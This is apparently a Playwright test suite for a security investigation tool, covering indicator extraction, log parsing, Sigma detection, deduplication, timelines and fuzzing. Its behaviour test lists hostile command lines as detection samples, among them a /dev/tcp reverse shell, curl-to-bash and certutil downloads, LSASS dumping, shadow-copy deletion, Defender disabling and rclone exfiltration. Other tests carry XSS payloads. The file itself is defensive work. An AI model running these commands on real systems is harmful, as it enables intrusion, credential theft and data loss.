// Real-world input, not the demo data: messy indicators, many log formats, behaviour
// on real command lines (and benign look-alikes that must NOT be flagged), duplicates
// that must and must not merge, odd timelines, broken files, and random input fed to
// every engine. Each check states the right answer, not just "no crash".
const { test, expect } = require('@playwright/test');
const { open, noErrors } = require('./helpers');

test('indicators: defanged, unicode, IPv6, hashes and the things that are NOT indicators', async ({ page }) => {
  const errors = await open(page, '#/home');
  const R = await page.evaluate(() => { const X = t => E.extract(t).map(e => e.k + ':' + e.v).sort(); return {
    defang:X('C2 at hxxps://evil[.]example[.]com/a?b=1, 45[.]33[.]32[.]156, user[at]corp[.]com, admin(at)site(.)com and evil{.}net'),
    idn:X('visit раураl.com and xn--80ak6aa92e.com'),
    ipv6:X('connected to 2001:db8::1 and fe80::1%eth0'),
    email:X('mail john.doe+tag@example.co.uk, "Bob" <Bob@Sub.Example.ORG>'),
    hash:X('md5 d41d8cd98f00b204e9800998ecf8427e sha1 da39a3ee5e6b4b0d3255bfef95601890afd80709 sha256 e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855'),
    cve:X('Patched cve-2021-44228 and CVE-2024-3400.'),
    trailing:X('Go to https://ex.com/a). Or https://ex.com/b.'),
    btc:X('pay bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh'),
    none:[X('The meeting is at 10.30 on Monday, version 2.1, see section 4.2.1'), X('Windows 10.0.17763 build 1.2'), X('ClientId {3F2504E0-4F89-11D3-9A0C-0305E82C3301}'), X('opened invoice.pdf and notes.txt'), X('')],
  }; });
  expect(R.defang).toEqual(expect.arrayContaining(['ipv4:45.33.32.156', 'domain:evil.example.com', 'url:https://evil.example.com/a?b=1', 'email:user@corp.com', 'email:admin@site.com', 'domain:evil.net']));
  expect(R.idn).toEqual(['domain:xn--80ak6aa92e.com', 'domain:раураl.com']);              // kept whole, never cut to "l.com"
  expect(R.ipv6).toEqual(expect.arrayContaining(['ipv6:2001:db8::1', 'ipv6:fe80::1']));
  expect(R.email).toEqual(['email:bob@sub.example.org', 'email:john.doe+tag@example.co.uk']);
  expect(R.hash).toEqual(expect.arrayContaining(['md5:d41d8cd98f00b204e9800998ecf8427e', 'sha1:da39a3ee5e6b4b0d3255bfef95601890afd80709', 'sha256:e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855']));
  expect(R.cve).toEqual(['cve:CVE-2021-44228', 'cve:CVE-2024-3400']);
  expect(R.trailing).toEqual(expect.arrayContaining(['url:https://ex.com/a', 'url:https://ex.com/b']));
  expect(R.btc).toEqual(['btc:bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh']);
  for (const n of R.none) expect(n).toEqual([]);                                            // prose, versions, GUIDs, documents: nothing
  noErrors(errors);
});

test('log formats: the same kind of event from nine products is read into the same fields, and a Sigma rule fires on all of them', async ({ page }) => {
  const errors = await open(page, '#/home');
  const R = await page.evaluate(() => {
    const L = {
      sysmonXml: '<Event><System><EventID>1</EventID><Computer>WS1</Computer></System><EventData><Data Name="Image">C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</Data><Data Name="CommandLine">powershell -nop -enc SQBFAFgA</Data><Data Name="ParentImage">C:\\Windows\\explorer.exe</Data></EventData></Event>',
      ecsJson: '{"@timestamp":"2026-11-01T10:00:00Z","host":{"name":"WS2"},"process":{"command_line":"powershell -nop -enc SQBFAFgA","executable":"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe"},"event":{"code":"1"}}',
      sysmonKv: 'EventID=1 Image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" CommandLine="powershell -nop -enc SQBFAFgA" User=CORP\\bob',
      winText: 'A new process has been created.\nCreator Subject:\n  Account Name: bob\nProcess Information:\n  New Process Name: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n  Process Command Line: powershell -nop -enc SQBFAFgA\n  Creator Process Name: C:\\Windows\\explorer.exe',
      winTextOneLine: 'A new process has been created. New Process Name: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe Process Command Line: powershell -nop -enc SQBFAFgA',
    };
    const net = {
      cef: 'CEF:0|Vendor|Product|1.0|100|Blocked|7|src=10.0.0.5 dst=203.0.113.9 dpt=443 suser=alice act=blocked',
      leef: 'LEEF:2.0|IBM|QRadar|1.0|Login|src=192.0.2.4\tusrName=bob',
      ssh: 'Nov  1 10:00:00 web01 sshd[123]: Failed password for invalid user admin from 198.51.100.7 port 51515 ssh2',
      apache: '198.51.100.7 - - [01/Nov/2026:10:00:00 +0000] "GET /wp-login.php HTTP/1.1" 404 512 "-" "curl/8.0"',
      forti: 'date=2026-11-01 time=10:00:00 devname=FGT logid=0000000013 srcip=10.1.1.1 dstip=8.8.8.8 dstport=53 action=accept',
    };
    ensureRules(); const rule = DB.rules.find(r => r.title === 'PowerShell Encoded Command Execution'), P = sigmaParse(rule.code);
    const proc = Object.fromEntries(Object.entries(L).map(([k, t]) => { const f = recFields({ title: '', body: t, host: '', source: '' }); return [k, { img: (f.image || '').split('\\').pop(), cmd: f.commandline || '', fires: sigmaEval(P, f) }]; }));
    const benign = recFields({ title: '', body: 'EventID=1 Image="C:\\Windows\\System32\\cmd.exe" CommandLine="cmd /c dir"', host: '', source: '' });
    const n = Object.fromEntries(Object.entries(net).map(([k, t]) => { const p = parseLog(t); return [k, p ? { fmt: p.format, n: p.norm } : null]; }));
    return { proc, benignFires: sigmaEval(P, benign), net: n, empty: parseLog(''), junk: parseLog('just some words without structure') };
  });
  for (const [k, v] of Object.entries(R.proc)) { expect(v.img, k).toBe('powershell.exe'); expect(v.cmd, k).toContain('-enc'); expect(v.fires, k).toBe(true); }
  expect(R.benignFires).toBe(false);
  expect(R.net.cef.n['src.ip']).toBe('10.0.0.5'); expect(R.net.cef.n['dst.port']).toBe('443'); expect(R.net.cef.n.user).toBe('alice');
  expect(R.net.leef.n['src.ip']).toBe('192.0.2.4'); expect(R.net.leef.n.user).toBe('bob');
  expect(R.net.ssh.n['src.ip']).toBe('198.51.100.7'); expect(R.net.ssh.n.user).toBe('admin'); expect(R.net.ssh.fmt).toContain('SSH');
  expect(R.net.apache.n['src.ip']).toBe('198.51.100.7'); expect(R.net.apache.n.url).toBe('/wp-login.php');
  expect(R.net.forti.fmt).toContain('FortiGate'); expect(R.net.forti.n['dst.ip']).toBe('8.8.8.8');
  expect(R.empty).toBeNull();
  noErrors(errors);
});

test('behaviour: real attacker command lines are recognised; everyday admin commands are not', async ({ page }) => {
  const errors = await open(page, '#/home');
  const R = await page.evaluate(() => { const tags = t => E.observations({ title: '', body: t, tags: [], ents: E.extract(t), host: '' }).map(o => o.tag);
    const bad = [['powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA', 'encoded'], ['certutil -urlcache -split -f http://203.0.113.5/a.exe a.exe', 'download'], ['bitsadmin /transfer j http://x.example/a.exe C:\\a.exe', 'download'],
      ['powershell IEX (New-Object Net.WebClient).DownloadString("http://x/a")', 'download'], ['curl -fsSL http://x.example/i.sh | bash', 'download'], ['wevtutil cl Security', 'anti-forensics'], ['history -c', 'anti-forensics'],
      ['vssadmin delete shadows /all /quiet', 'impact'], ['bcdedit /set {default} recoveryenabled No', 'impact'], ['schtasks /create /tn Upd /tr C:\\x.exe /sc onlogon', 'persistence'], ['sc create svc binPath= C:\\x.exe', 'persistence'],
      ['echo "* * * * * /tmp/x" >> /etc/crontab', 'persistence'], ['net user hacker P@ssw0rd /add', 'account'], ['net localgroup administrators hacker /add', 'account'], ['mshta http://evil.example/x.hta', 'proxy execution'],
      ['rundll32.exe C:\\Users\\Public\\x.dll,Start', 'proxy execution'], ['regsvr32 /s /n /u /i:http://x.example/a.sct scrobj.dll', 'proxy execution'], ['procdump64.exe -ma lsass.exe out.dmp', 'credentials'],
      ['rundll32 C:\\windows\\system32\\comsvcs.dll MiniDump 624 C:\\temp\\l.dmp full', 'credentials'], ['reg save HKLM\\SAM sam.hiv', 'credentials'], ['nltest /domain_trusts', 'discovery'], ['net group "domain admins" /domain', 'discovery'],
      ['psexec \\\\FS01 -s cmd', 'lateral movement'], ['wmic /node:10.0.0.9 process call create calc', 'lateral movement'], ['Set-MpPreference -DisableRealtimeMonitoring $true', 'defenses off'], ['netsh advfirewall set allprofiles state off', 'defenses off'],
      ['7z a -pS3cret loot.7z C:\\Finance', 'staging'], ['rclone copy C:\\Finance mega:loot', 'exfiltration'], ['bash -i >& /dev/tcp/10.0.0.1/4444 0>&1', 'c2'], ['Invoice.pdf.exe opened from Downloads', 'lure']];
    const ok = ['schtasks /query /fo list', 'net user bob', 'certutil -hashfile a.exe SHA256', 'wevtutil qe Security /c:5', 'vssadmin list shadows', 'whoami', 'curl https://example.com -o page.html', 'tar -czf backup.tgz /home',
      'Get-Service WinDefend', 'regsvr32 /s mydll.dll', 'ipconfig /all', 'git push origin main', 'The quarterly report is attached', 'ping 8.8.8.8', 'Get-ChildItem C:\\Users'];
    return { bad: bad.map(([t, want]) => [t, want, tags(t)]), ok: ok.map(t => [t, tags(t)]) }; });
  for (const [t, want, got] of R.bad) expect(got, t).toContain(want);
  for (const [t, got] of R.ok) expect(got, t).toEqual([]);
  noErrors(errors);
});

test('duplicates: written differently but the same → merged; similar but different → kept apart', async ({ page }) => {
  const errors = await open(page, '#/home');
  const R = await page.evaluate(() => {
    const c = { id: 'c-dup', code: 'DUP-1', name: 'Dups', status: 'active', color: '#4f46e5', icon: 'folder', scope: '', created: Date.now() }; normCase(c); DB.cases.push(c);
    const T = (type, v) => { const t = TYPES[type]; const e = { id: uid('v'), caseId: 'c-dup', type, fields: { [t.fields[0][0]]: v }, priority: 'low', starred: false, tags: [], notes: '', src: '', created: Date.now() }; normEntry(e); DB.entries.push(e); return e; };
    const same = [['email', 'Bob@Corp.com', 'bob@corp[.]com'], ['domain', 'www.Evil.example', 'evil.example.'], ['url', 'https://x.example/a/', 'hxxps://x.example/a'], ['phone', '+1 (555) 010-2030', '555.010.2030'],
      ['person', 'Jordan Okafor', 'Okafor, Jordan'], ['person', 'José Núñez', 'Jose Nunez'], ['username', '@lampmaker', 'LampMaker'], ['ip', '203.0.113.7', '203.0.113.7']];
    const diff = [['email', 'john.doe@corp.com', 'jane.doe@corp.com'], ['domain', 'mail.example.com', 'example.com'], ['phone', '+1 555 010 2030', '+1 555 010 2031'], ['person', 'John Smith', 'John Smithson'],
      ['username', 'bob1', 'bob2'], ['crypto', '1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa', '1a1zp1ep5qgefi2dmptftl5slmv7divfna'], ['ip', '203.0.113.7', '203.0.113.70']];
    const pairs = [...same.map(x => ['same', ...x]), ...diff.map(x => ['diff', ...x])].map(([want, type, a, b]) => { const A = T(type, a), B = T(type, b); return { want, type, a, b, A: A.id, B: B.id }; });
    const G = dupGroups('c-dup'), together = (x, y) => G.some(g => g.G.some(e => e.id === x) && g.G.some(e => e.id === y));
    const loose = G.filter(g => !g.sure).map(g => g.G.map(primary));
    return { res: pairs.map(p => [p.want, p.type, p.a, p.b, together(p.A, p.B)]), loose };
  });
  for (const [want, type, a, b, got] of R.res) expect(got, `${type}: ${a} vs ${b}`).toBe(want === 'same');
  noErrors(errors);
});

test('odd timelines: empty, one event, all at the same second, no times, far future — patterns and the attack chain stay sensible', async ({ page }) => {
  const errors = await open(page, '#/home');
  const R = await page.evaluate(() => {
    const out = {}, mk = (id, ts, body, tags) => ({ id, caseId: 'c-odd', type: 'evidence', title: id, body: body || '', tsRaw: '', tsZone: 'explicit', ts, host: 'H', source: 's', tags: tags || [], ents: E.extract(body || ''), answer: '', addedBy: 'You', addedAt: Date.now(), hash: '' });
    const c = { id: 'c-odd', code: 'ODD-1', name: 'Odd', status: 'active', color: '#4f46e5', icon: 'folder', scope: '', created: Date.now() }; normCase(c); DB.cases.push(c);
    const run = (name, recs) => { DB.records = DB.records.filter(r => r.caseId !== 'c-odd').concat(recs); mutate(name); const D = derive('c-odd'); let A, C, html;
      try { A = tlxAnalyse(D); C = chainOf(c, D); html = tlxView(D) + chainView(c, D); } catch (e) { return 'THROW ' + e.message; }
      return { empty: !!A.empty, bursts: (A.bursts || []).length, gaps: (A.gaps || []).length, nan: /NaN|undefined|Infinity/.test(html), first: A.first ? A.first.r.id : null, future: A.time.future.length, seen: C.seen.length }; };
    const t0 = Date.UTC(2026, 9, 1, 9);
    out.none = run('none', []);
    out.one = run('one', [mk('a', t0, 'powershell -enc AAAAAAAAAAAAAAAAAAAAAAAA')]);
    out.same = run('same', Array.from({ length: 50 }, (_, i) => mk('s' + i, t0, 'event ' + i)));
    out.noTs = run('noTs', [mk('x', null, 'x'), mk('y', null, 'y')]);
    out.future = run('future', [mk('f1', t0, 'a'), mk('f2', t0 + 6e4, 'b'), mk('f3', Date.now() + 400 * 864e5, 'c')]);
    out.real = run('real', [mk('r1', t0, 'Invoice.pdf.exe opened', ['phishing']), mk('r2', t0 + 6e4, 'powershell -nop -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBi'), mk('r3', t0 + 12e4, 'schtasks /create /tn x /tr c:\\x.exe'), mk('r4', t0 + 36e5 * 30, 'rclone copy C:\\data mega:x')]);
    return out; });
  for (const [k, v] of Object.entries(R)) { expect(typeof v, k).toBe('object'); expect(v.nan, k + ' shows NaN/undefined').toBe(false); }
  expect(R.none.empty).toBe(true); expect(R.one.empty).toBe(true); expect(R.noTs.empty).toBe(true);
  expect(R.same.bursts).toBeLessThanOrEqual(1); expect(R.same.gaps).toBe(0);
  expect(R.future.future).toBe(1);
  expect(R.real.first).toBe('r1'); expect(R.real.seen).toBeGreaterThanOrEqual(4); expect(R.real.gaps).toBeGreaterThanOrEqual(1);
  noErrors(errors);
});

test('broken and unusual files: not-a-picture, empty, SVG and a broken video are stored without crashing anything', async ({ page }) => {
  const errors = await open(page, '#/case/c-lantern/media');
  const R = await page.evaluate(async () => {
    const files = [new File([new Uint8Array([1, 2, 3, 4, 5])], 'fake.jpg', { type: 'image/jpeg' }), new File([], 'empty.png', { type: 'image/png' }),
      new File(['<svg xmlns="http://www.w3.org/2000/svg" width="10" height="10"><script>alert(1)</script><rect width="10" height="10"/></svg>'], 'x.svg', { type: 'image/svg+xml' }),
      new File([new Uint8Array(4096).fill(7)], 'broken.mp4', { type: 'video/mp4' }), new File(['<html><script>alert(1)</script>hi</html>'], 'page.html', { type: 'text/html' })];
    draft.caseId = 'c-lantern'; await attachFiles(files.slice(0, 4)); await importWebPages([files[4]]);
    const I = caseMediaItems('c-lantern'); return { names: I.map(x => x.a.name).sort(), insight: (() => { try { return picView(theCase('c-lantern')).length > 0; } catch (e) { return 'THROW ' + e.message; } })() }; });
  expect(R.names).toEqual(expect.arrayContaining(['broken.mp4', 'empty.png', 'fake.jpg', 'x.svg']));
  expect(R.insight).toBe(true);
  await page.evaluate(() => { UI.mdV = 'files'; renderMain(); }); await page.waitForTimeout(800);
  expect(await page.evaluate(() => window.__alerted || false)).toBe(false);
  // Playwright's trace recorder re-reads blob: pictures from inside the page, which the app's own security policy refuses; that is the recorder, not the app
  noErrors(errors.filter(e => !/Connecting to 'blob:/.test(e)));
});

test('every built-in Sigma rule converts to every SIEM and survives the evasion check', async ({ page }) => {
  test.setTimeout(120_000);
  const errors = await open(page, '#/home');
  const R = await page.evaluate(() => { ensureRules(); const bad = [], S = DB.rules.filter(r => r.type === 'sigma');
    const balanced = q => { let d = 0, inS = false, inD = false; for (let i = 0; i < q.length; i++) { const ch = q[i]; if (ch === '\\') { i++; continue; } if (ch === '"' && !inS) inD = !inD; else if (ch === "'" && !inD) { if (q[i + 1] === "'" && inS) { i++; continue; } inS = !inS; } else if (!inS && !inD) { if (ch === '(') d++; if (ch === ')') d--; if (d < 0) return false; } } return d === 0 && !inS && !inD; };
    let conv = 0, ev = 0;
    for (const r of S) { for (const b of Object.keys(DL_BACK)) { let q; try { q = sigmaToQuery(r.code, b); } catch (e) { bad.push(r.title + ' / ' + b + ': THROW ' + e.message); continue; }
        if (q.error) continue; conv++; if (!q.q || /undefined|NaN|\[object/.test(q.q)) bad.push(r.title + ' / ' + b + ': empty or undefined'); else if (!balanced(q.q)) bad.push(r.title + ' / ' + b + ': unbalanced'); }
      try { dlEvasion(r, r.code); ev++; } catch (e) { bad.push(r.title + ' evasion: THROW ' + e.message); } }
    return { n: S.length, conv, ev, bad: bad.slice(0, 15) }; });
  expect(R.bad).toEqual([]);
  expect(R.conv).toBeGreaterThan(R.n * 5 * 0.95);
  noErrors(errors);
});

test('random input never breaks the engines', async ({ page }) => {
  const errors = await open(page, '#/home');
  const R = await page.evaluate(() => {
    let seed = 7; const rnd = () => (seed = (seed * 1103515245 + 12345) % 2147483648) / 2147483648;
    const pool = 'aZ09 .:/\\-_@[](){}<>|"\'=,;!?#$%^&*~`\n\t\u00e9\u0436\u4e2d\u{1F600}\u200b\u0000hxxp://[.]10.0.0.1 CEF:0| LEEF:2.0| <Event><EventID> {"a": EventID=4688 New Process Name: -enc ';
    const gen = n => { let s = ''; for (let i = 0; i < n; i++) s += pool[Math.floor(rnd() * pool.length)]; return s; };
    const fails = []; let slow = 0;
    for (let i = 0; i < 400; i++) { const s = gen(1 + Math.floor(rnd() * (i % 50 === 0 ? 20000 : 300))); const t0 = performance.now();
      for (const [name, fn] of [['extract', () => E.extract(s)], ['parseLog', () => parseLog(s)], ['recFields', () => recFields({ title: s.slice(0, 20), body: s, host: '', source: '' })], ['observations', () => E.observations({ title: '', body: s, tags: [], ents: E.extract(s), host: '' })],
        ['sigma', () => { const p = sigmaParse('detection:\n    s:\n        CommandLine|contains: \'' + s.slice(0, 30).replace(/'/g, '') + '\'\n    condition: s'); return p.cond ? sigmaEval(p, recFields({ title: '', body: s, host: '', source: '' })) : 0; }],
        ['noteInline', () => noteInline(s)], ['dupNorm', () => dupNorm({ type: 'person', fields: { name: s } })], ['lineTime', () => E.lineTime(s)]]) { try { fn(); } catch (e) { fails.push(name + ': ' + e.message + ' :: ' + JSON.stringify(s.slice(0, 60))); } }
      if (performance.now() - t0 > 400) slow++; }
    const inl = noteInline('<img src=x onerror=alert(1)> **b** `c`');
    return { fails: fails.slice(0, 10), slow, safe: !/<img/.test(inl) && /<b>b<\/b>/.test(inl) }; });
  expect(R.fails).toEqual([]); expect(R.slow).toBe(0); expect(R.safe).toBe(true);
  noErrors(errors);
});

test('a workspace with nothing in it: every new screen draws', async ({ page }) => {
  const errors = await open(page, '#/home');
  await page.evaluate(() => { DB.cases = []; DB.records = []; DB.entries = []; DB.links = []; DB.notes = []; DB.active = null; DB.autos = []; mutate('empty'); });
  for (const h of ['#/today', '#/notes', '#/playbooks', '#/detections', '#/feeds', '#/home']) { await page.evaluate(h => go(h), h); await expect(page.locator('#main')).not.toContainText('failed to draw'); }
  await page.evaluate(() => { UI.pbTab = 'auto'; go('#/playbooks'); }); await expect(page.locator('.au-intro')).toBeVisible();
  await page.evaluate(() => { const c = { id: 'c-new', code: 'NEW-1', name: 'New', status: 'active', color: '#4f46e5', icon: 'folder', scope: '', created: Date.now() }; normCase(c); DB.cases.push(c); DB.active = 'c-new'; mutate('c'); });
  for (const tab of ['overview', 'vault', 'entities', 'timeline', 'media', 'graph', 'analysis']) { await page.evaluate(t => go(caseHash('c-new', t)), tab); await expect(page.locator('#main')).not.toContainText('failed to draw'); }
  for (const m of ['patterns', 'chain']) { await page.evaluate(m => { UI.tlMode = m; go(caseHash('c-new', 'timeline')); renderMain(); }, m); await expect(page.locator('#main')).not.toContainText('failed to draw'); }
  await page.evaluate(() => { UI.mdV = 'pic'; go(caseHash('c-new', 'media')); renderMain(); }); await expect(page.locator('#main')).not.toContainText('failed to draw');
  noErrors(errors);
});

test('the graph button on a vault card opens the graph on that entry', async ({ page }) => {
  const errors = await open(page, '#/case/c-lantern/vault');
  await page.evaluate(() => { DB.prefs.vLay = 'cards'; renderMain(); });
  const card = page.locator('.ec2[data-id=v-actor]'); await card.hover();
  await card.locator('[data-act=showInGraph]').click();
  await expect.poll(() => page.evaluate(() => location.hash)).toBe('#/case/c-lantern/graph');
  await expect.poll(() => page.evaluate(() => typeof cy !== 'undefined' && cy && cy.getElementById('v-actor').selected())).toBe(true);
  // the same from the details panel
  await page.evaluate(() => go(caseHash('c-lantern', 'vault'))); await expect(page.locator('.ec2').first()).toBeVisible();
  await page.evaluate(() => selectEntry('v-handle'));
  await page.locator('#insp [data-act=showInGraph]').click();
  await expect.poll(() => page.evaluate(() => typeof cy !== 'undefined' && cy && cy.getElementById('v-handle').selected())).toBe(true);
  noErrors(errors);
});
